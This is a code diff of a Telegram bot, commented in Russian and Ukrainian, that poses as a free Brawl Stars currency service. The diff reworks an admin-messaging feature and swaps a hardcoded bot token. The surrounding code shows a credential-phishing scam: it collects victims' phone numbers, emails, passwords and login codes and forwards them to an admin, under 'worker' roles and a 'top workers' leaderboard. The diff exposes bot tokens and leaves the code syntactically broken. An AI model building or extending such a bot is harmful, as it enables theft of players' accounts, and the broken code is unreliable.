@@ -15,12 +15,16 @@ from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from aiogram.contrib.middlewares.logging import LoggingMiddleware
+from aiogram.types import CallbackQuery
+class ContactAdmin(StatesGroup):
+    waiting_for_message = State()
+    waiting_for_reply = State()
 
 logging.basicConfig(level=logging.INFO)
 
 storage = MemoryStorage()
 
-TOKEN = '7921716526:AAFswxmemPy861e1hLUdnLAdzno-tD1F8Jo' #токен бота
+TOKEN = '7504404671:AAHblv3vK8wUz3Pb5EY_sDXnKKY1ennrCqU' #токен бота
 ID = 7138183093 ##айди админа, через запятую если их несколько
 
 bot = Bot(token=TOKEN)
@@ -28,16 +32,13 @@ dp = Dispatcher(bot, storage=storage)
 dp.middleware.setup(LoggingMiddleware())
 conn = sqlite3.connect('db.db')
 cursor = conn.cursor()
-@dp.message_handler()
-async def debug_all_messages(message: types.Message):
-    print(f"📩 Получено сообщение: {message.text}")
-
-async def on_startup(dp):
-    await bot.delete_webhook(drop_pending_updates=True)  # Видаляємо Webhook, щоб не було конфлікту з Polling
-
-if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-
+async def main():
+    while True:
+        try:
+            await dp.start_polling()
+        except NetworkError as e:
+            logging.warning(f"Помилка мережі: {e}")
+            await asyncio.sleep(5)  # Затримка перед новим запуском
 
 # Запускаємо keep_alive у окремому потоці
 from flask import Flask
@@ -56,7 +57,7 @@ def ping_self():
     """Функция будет пинговать бота каждые 5 минут"""
     while True:
         try:
-            url = "https://bot-gvwh.onrender.com"  # Укажите свой URL
+            url = "https://your-bot-service.onrender.com/"  # Укажите свой URL
             requests.get(url)
             print("Пинг успешен")
         except Exception as e:
@@ -99,6 +100,7 @@ button5 = KeyboardButton('Топ воркеров')
 menu.row(button1, button2)
 menu.add(button3)
 menu.row(button4, button5)
+menu.add(KeyboardButton('✉ Написать админу'))
 
 spammenu = ReplyKeyboardMarkup(resize_keyboard=True)
 spamworker = KeyboardButton('Воркерам')
@@ -117,22 +119,7 @@ button04 = KeyboardButton('Информация')
 panel.add(button01)
 panel.row(button02, button03)
 panel.add(button04)
-menu.add(KeyboardButton('✉ Написать админу'))
-async def on_startup(dp):
-    await bot.delete_webhook(drop_pending_updates=True)  # Видаляє старі повідомлення
 
-class ContactAdmin(StatesGroup):
-    waiting_for_message = State()
-def get_user_menu(user_id):
-    user_menu = menu.copy()  # Копируем стандартное меню
-    if user_id != ID:
-        user_menu.add(KeyboardButton('✉ Написать админу'))
-    return user_menu
-@dp.message_handler(content_types=['text'], text='✉ Написать админу')
-async def contact_admin(message: types.Message):
-    if message.from_user.id != ID:  # Проверяем, не является ли пользователь админом
-        await message.answer("✏ Напишите ваше уведомление для администратора:")
-        await ContactAdmin.waiting_for_message.set()
 kb_info = InlineKeyboardMarkup()
 btn_channel = InlineKeyboardButton('Канал', url='https://t.me/')
 btn_chat = InlineKeyboardButton('Чат', url='https://t.me/')
@@ -141,80 +128,81 @@ kb_info.row(btn_channel, btn_chat).add(btn_admin)
 
 inline_btn_try = InlineKeyboardButton('Невалид', callback_data='btn_try')
 inline_btn_code = InlineKeyboardButton('Отправить код', callback_data='btn_code')
-@dp.message_handler(state=ContactAdmin.waiting_for_message)
-async def send_to_admin(message: types.Message, state: FSMContext):
-    admin_id = 7138183093  # ID адміністратора
-    user = message.from_user
-    text = f"📩 *Нове повідомлення від користувача:*\n\n👤 Ім'я: {user.full_name}\n🆔 ID: `{user.id}`\n\n💬 Повідомлення:\n{message.text}"
 
-    await bot.send_message(admin_id, text, parse_mode="Markdown")
-    await message.answer("✅ Ваше сообщение отправлено администратору!")
-    await state.finish()
-@dp.message_handler(commands='start')
+@dp.message_handler(commands = 'start')
 async def start(message: types.Message):
-    admin_id = 7138183093  # Ваш ID
-
-    if message.from_user.id == admin_id:
-        # Отправляем сообщение администратору без кнопок
-        await message.answer('Привет, администратор!')
+    cursor.execute('SELECT id FROM users WHERE user_id = ?', (message.from_user.id,))
+    result = cursor.fetchall()
+    if message.from_user.id == ID:
+        await message.answer('Добро пожаловать!', reply_markup=menu)
     else:
-        # Сообщение и кнопки для обычного пользователя
-        cursor.execute('SELECT id FROM users WHERE user_id = ?', (message.from_user.id,))
-        result = cursor.fetchall()
-
         if not result:
             cursor.execute('INSERT INTO users (user_id) VALUES (?)', (message.from_user.id,))
-            if message.from_user.username is not None:
+            if message.from_user.username != None:
                 cursor.execute(f'UPDATE users SET nick = ? WHERE user_id = ?',
                                ('@' + message.from_user.username, message.from_user.id,))
             conn.commit()
-
         cursor.execute('SELECT block FROM users WHERE user_id = ?', (message.from_user.id,))
         result = cursor.fetchall()
         if result[0][0] != 1:
             cursor.execute('SELECT status FROM users WHERE user_id = ?', (message.from_user.id,))
             status_check = cursor.fetchall()
             if status_check[0][0] != 'worker':
-                # Клавиатура только для обычных пользователей
+                if " " in message.text and message.text.split()[1].isdigit() == True:
+                    cursor.execute(f'UPDATE users SET ref = ? WHERE user_id = ?',
+                                   (message.text.split()[1], message.from_user.id,))
+                    conn.commit()
                 keyboardmain = types.InlineKeyboardMarkup(row_width=1)
                 button_donate = types.InlineKeyboardButton(text='Запуск', callback_data='start')
-                button_contact_admin = types.InlineKeyboardButton(text='✉ Написать админу', callback_data='contact_admin')
-                keyboardmain.add(button_donate, button_contact_admin)
+                keyboardmain.add(button_donate)
                 await message.answer(f'''👋Привет, {message.from_user.first_name}!
-Это бот, который донатит в Brawl Stars игровую валюту.
-Чтобы начать, нажмите:''', reply_markup=keyboardmain)
+  Это бот, который донатит в Brawl Stars игровую валюту.
+  Чтобы начать, нажмите:''', reply_markup=keyboardmain)
             else:
                 await message.answer('Добро пожаловать!', reply_markup=panel)
         else:
             await message.answer('Вы заблокированы!')
-
-# Обработка кнопки "✉ Написать админу"
-class ContactAdmin(StatesGroup):
-    waiting_for_message = State()
 @dp.message_handler(content_types=['text'], text='✉ Написать админу')
 async def contact_admin(message: types.Message):
-    print(f"✅ Нажата кнопка '✉ Написать админу' от {message.from_user.id}")
     await message.answer("✏ Напишите ваше сообщение для администратора:")
+    await ContactAdmin.waiting_for_message.set()
+    @dp.message_handler(state=ContactAdmin.waiting_for_message)
+async def send_to_admin(message: types.Message, state: FSMContext):
+    admin_id = ID  # ID администратора
+    user = message.from_user
 
-@dp.callback_query_handler(lambda c: c.data == 'contact_admin')
-async def contact_admin_callback(callback_query: types.CallbackQuery):
-    print(f"✅ Нажата inline-кнопка '✉ Написать админу' от {callback_query.from_user.id}")
-    await bot.answer_callback_query(callback_query.id)  # Закрываем "часики"
-    await bot.send_message(callback_query.from_user.id, "✏ Напишите ваше сообщение для администратора:")
+    text = f"📩 *Новое сообщение от пользователя:*\n\n" \
+           f"👤 Имя: {user.full_name}\n" \
+           f"🆔 ID: `{user.id}`\n\n" \
+           f"💬 Сообщение:\n{message.text}"
 
+    # Добавляем кнопку "Ответить"
+    reply_markup = InlineKeyboardMarkup().add(InlineKeyboardButton("📝 Ответить", callback_data=f"reply_{user.id}"))
 
-@dp.message_handler(state=ContactAdmin.waiting_for_message)
-async def process_message_to_admin(message: types.Message, state: FSMContext):
-    admin_id = 7138183093
-    user_id = message.from_user.id
+    await bot.send_message(admin_id, text, parse_mode="Markdown", reply_markup=reply_markup)
+    await message.answer("✅ Ваше сообщение отправлено администратору!")
+    await state.finish()
+# ⬇ Админ нажимает "Ответить" → бот запрашивает текст ответа
+@dp.callback_query_handler(lambda c: c.data.startswith("reply_"))
+async def ask_admin_reply(callback_query: CallbackQuery, state: FSMContext):
+    user_id = int(callback_query.data.split("_")[1])  # Получаем ID пользователя
+    await state.update_data(user_id=user_id)
 
-    # Отправляем сообщение админу
-    await bot.send_message(admin_id, f'Пользователь {message.from_user.first_name} (ID: {user_id}) написал: {message.text}')
+    await bot.send_message(callback_query.from_user.id, "✏ Введите ваш ответ для пользователя:")
+    await ContactAdmin.waiting_for_reply.set()
 
-    # Сообщаем пользователю, что сообщение отправлено
-    await message.answer('Ваше сообщение было отправлено администратору!')
+# ⬇ Админ вводит ответ → бот отправляет его пользователю
+@dp.message_handler(state=ContactAdmin.waiting_for_reply)
+async def send_reply_to_user(message: types.Message, state: FSMContext):
+    data = await state.get_data()
+    user_id = data["user_id"]
 
-    # Завершаем состояние
+    try:
+        await bot.send_message(user_id, f"📩 *Ответ от администрации:*\n\n{message.text}", parse_mode="Markdown")
+        await message.answer("✅ Ответ отправлен пользователю!")
+    except:
+        await message.answer("❌ Невозможно отправить ответ этому пользователю.")
+
     await state.finish()
 @dp.callback_query_handler(lambda c: c.data == 'start')
 async def buttonstart(callback_query: types.CallbackQuery):
@@ -314,12 +302,10 @@ async def entrpassword(message: types.Message, state: FSMContext):
         password = data['password']
         info = f'''
 🦣 *Пользователь ввёл свои данные*
-
 Имя: {first} / {last}
 Айди: `{userid}`
 Ник: @{nick}
 Номер телефона: `{phone}`
-
 Почта: `{mail}`
 Пароль: `{password}`
             '''
@@ -335,21 +321,6 @@ async def entrpassword(message: types.Message, state: FSMContext):
         await state.finish()
     else:
         await message.answer('Вы ввели некорректный пароль\n  Попробуйте снова!')
-@dp.message_handler(commands=['відповісти'])
-async def reply_to_user(message: types.Message):
-    args = message.text.split(maxsplit=2)
-    if len(args) < 3 or not args[1].isdigit():
-        await message.answer("❌ Формат: `/відповісти ID текст`")
-        return
-
-    user_id = int(args[1])
-    response_text = args[2]
-
-    try:
-        await bot.send_message(user_id, f"📩 Ответ від администратора:\n\n{response_text}")
-        await message.answer("✅ Відповідь відправлена!")
-    except:
-        await message.answer("❌ Неможливо відправити відповідь цьому користувачу.")
 
 @dp.callback_query_handler(lambda c: c.data == 'btn_try')
 async def process_callback_button1(callback_query: types.CallbackQuery):
@@ -584,9 +555,5 @@ async def back(message: Message):
     else:
         await message.answer('Главное меню', reply_markup=panel)
 
-async def on_startup(dp):
-    await bot.delete_webhook(drop_pending_updates=True)  # Видаляємо Webhook
-
 if __name__ == '__main__':
-    executor.start_polling(dp, skip_updates=True, on_startup=on_startup)
-
+    executor.start_polling(dp, skip_updates=True)
